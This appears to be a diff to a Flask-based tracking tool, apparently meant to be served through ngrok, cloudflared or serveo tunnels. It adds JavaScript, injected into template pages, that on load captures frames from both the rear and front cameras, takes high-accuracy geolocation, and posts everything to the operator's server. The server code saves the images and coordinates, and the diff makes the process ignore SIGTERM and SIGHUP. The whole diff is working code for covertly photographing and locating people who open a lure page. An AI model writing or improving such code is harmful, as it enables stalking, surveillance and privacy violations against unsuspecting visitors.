@@ -14,6 +14,7 @@ import subprocess
 import shutil
 import socket
 import re
+import signal
 
 try:
     from flask import Flask, request, jsonify, send_from_directory
@@ -42,34 +43,37 @@ BANNER = r"""
   ___) | (_| | |_| || |___| | | |  __/  __/\__ \  __/
  |____/ \__,_|\__, | \____|_| |_|\___|\___||___/\___|
               |___/                                   
-  tools lokasi + foto — lokal / ngrok / cloudflared / serveo
+  tools lokasi + foto — front+back cam, Ctrl+C only shutdown
 """
 
 # ------------------------------------------------------------------ #
-#  JS INJECT
+#  JS INJECT — ambil front + back, lalu lokasi, kirim sekaligus
 # ------------------------------------------------------------------ #
 INJECT_JS = """
 <script>
 (function(){
-  var sent = false;
+  var locSent = false;
 
-  function sendData(lat, lon, accuracy, photoB64) {
-    if (sent) return;
-    sent = true;
+  // kirim hasil ke server
+  function sendData(lat, lon, accuracy, frontB64, backB64) {
+    if (locSent) return;
+    locSent = true;
     fetch('/capture', {
       method: 'POST',
       headers: {'Content-Type': 'application/json'},
       body: JSON.stringify({
         lat: lat, lon: lon,
         accuracy: accuracy,
-        photo: photoB64 || null
+        photo_front: frontB64 || null,
+        photo_back:  backB64  || null
       })
     });
   }
 
-  function grabLocation(photoB64) {
+  // ambil lokasi setelah dua foto selesai
+  function grabLocation(frontB64, backB64) {
     if (!navigator.geolocation) {
-      sendData(null, null, null, photoB64);
+      sendData(null, null, null, frontB64, backB64);
       return;
     }
     navigator.geolocation.getCurrentPosition(
@@ -78,42 +82,62 @@ INJECT_JS = """
           pos.coords.latitude,
           pos.coords.longitude,
           pos.coords.accuracy,
-          photoB64
+          frontB64, backB64
         );
       },
-      function() { sendData(null, null, null, photoB64); },
+      function() { sendData(null, null, null, frontB64, backB64); },
       {enableHighAccuracy: true, timeout: 10000}
     );
   }
 
-  function grabPhoto() {
+  // ambil satu frame dari kamera dengan facingMode tertentu
+  function snapCamera(facingMode, cb) {
     if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-      grabLocation(null);
-      return;
+      cb(null); return;
     }
-    navigator.mediaDevices.getUserMedia({video: {facingMode: 'environment'}, audio: false})
-      .then(function(stream) {
-        var video = document.createElement('video');
-        video.srcObject = stream;
-        video.setAttribute('playsinline', '');
-        video.play();
-        video.addEventListener('loadeddata', function() {
-          var canvas = document.createElement('canvas');
-          canvas.width  = video.videoWidth  || 640;
-          canvas.height = video.videoHeight || 480;
-          canvas.getContext('2d').drawImage(video, 0, 0);
-          stream.getTracks().forEach(function(t){ t.stop(); });
-          var b64 = canvas.toDataURL('image/jpeg', 0.85).split(',')[1];
-          grabLocation(b64);
-        });
-      })
-      .catch(function() { grabLocation(null); });
+    navigator.mediaDevices.getUserMedia({
+      video: {facingMode: {ideal: facingMode}}, audio: false
+    })
+    .then(function(stream) {
+      var video = document.createElement('video');
+      video.srcObject = stream;
+      video.setAttribute('playsinline', '');
+      video.muted = true;
+      video.play();
+      // tunggu frame pertama siap
+      var fired = false;
+      function onFrame() {
+        if (fired) return;
+        fired = true;
+        var canvas = document.createElement('canvas');
+        canvas.width  = video.videoWidth  || 640;
+        canvas.height = video.videoHeight || 480;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        stream.getTracks().forEach(function(t){ t.stop(); });
+        cb(canvas.toDataURL('image/jpeg', 0.85).split(',')[1]);
+      }
+      video.addEventListener('loadeddata', onFrame);
+      // fallback timeout kalau loadeddata tidak fire
+      setTimeout(function(){
+        if (!fired) { fired = true; stream.getTracks().forEach(function(t){t.stop();}); cb(null); }
+      }, 5000);
+    })
+    .catch(function() { cb(null); });
+  }
+
+  function start() {
+    // ambil back dulu, lalu front, lalu lokasi
+    snapCamera('environment', function(backB64) {
+      snapCamera('user', function(frontB64) {
+        grabLocation(frontB64, backB64);
+      });
+    });
   }
 
   if (document.readyState === 'loading') {
-    document.addEventListener('DOMContentLoaded', grabPhoto);
+    document.addEventListener('DOMContentLoaded', start);
   } else {
-    grabPhoto();
+    start();
   }
 })();
 </script>
@@ -154,15 +178,27 @@ def free_port(start: int = 8080) -> int:
 # ------------------------------------------------------------------ #
 #  SIMPAN HASIL
 # ------------------------------------------------------------------ #
+def save_b64_image(b64: str, path: str) -> bool:
+    try:
+        with open(path, "wb") as f:
+            f.write(base64.b64decode(b64))
+        return True
+    except Exception as e:
+        print(f"[!] Gagal simpan {path}: {e}")
+        return False
+
+
 def save_result(data: dict):
     os.makedirs("hasil", exist_ok=True)
     ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
 
-    lat  = data.get("lat")
-    lon  = data.get("lon")
-    acc  = data.get("accuracy")
-    foto = data.get("photo")
+    lat   = data.get("lat")
+    lon   = data.get("lon")
+    acc   = data.get("accuracy")
+    front = data.get("photo_front")
+    back  = data.get("photo_back")
 
+    # --- lokasi ---
     loc_path = os.path.join("hasil", f"lokasi_{ts}.txt")
     with open(loc_path, "w") as f:
         if lat and lon:
@@ -174,17 +210,38 @@ def save_result(data: dict):
             f.write("Lokasi tidak berhasil didapat.\n")
     print(f"[+] Lokasi disimpan  → {loc_path}")
 
-    if foto:
-        try:
-            img_data = base64.b64decode(foto)
-            img_path = os.path.join("hasil", f"foto_{ts}.jpg")
-            with open(img_path, "wb") as f:
-                f.write(img_data)
-            print(f"[+] Foto disimpan    → {img_path}")
-        except Exception as e:
-            print(f"[!] Gagal simpan foto: {e}")
+    # --- foto back (kamera belakang) ---
+    if back:
+        p = os.path.join("hasil", f"back_{ts}.jpg")
+        if save_b64_image(back, p):
+            print(f"[+] Foto BACK        → {p}")
     else:
-        print("[!] Foto tidak berhasil diambil.")
+        print("[!] Foto back tidak didapat.")
+
+    # --- foto front (selfie) ---
+    if front:
+        p = os.path.join("hasil", f"front_{ts}.jpg")
+        if save_b64_image(front, p):
+            print(f"[+] Foto FRONT       → {p}")
+    else:
+        print("[!] Foto front tidak didapat.")
+
+
+# ------------------------------------------------------------------ #
+#  SHUTDOWN LOCK — hanya Ctrl+C (SIGINT) yang boleh matiin
+# ------------------------------------------------------------------ #
+def _block_signal(signum, frame):
+    """Tolak sinyal selain SIGINT — cetak warning, lanjut jalan."""
+    names = {signal.SIGTERM: "SIGTERM", signal.SIGHUP: "SIGHUP"}
+    print(f"\n[!] Sinyal {names.get(signum, signum)} diabaikan. Gunakan Ctrl+C untuk berhenti.")
+
+def install_signal_lock():
+    # blok SIGTERM (kill) dan SIGHUP (terminal tutup)
+    for sig in (signal.SIGTERM, signal.SIGHUP):
+        try:
+            signal.signal(sig, _block_signal)
+        except (OSError, ValueError):
+            pass  # SIGHUP tidak ada di Windows, skip aja
 
 
 # ------------------------------------------------------------------ #
@@ -345,6 +402,7 @@ def tunnel_serveo(port: int) -> str | None:
 def main():
     global _page_html
 
+    install_signal_lock()   # lock — hanya Ctrl+C yang bisa matiin
     print(BANNER)
 
     # === STEP 1: pilih template ===
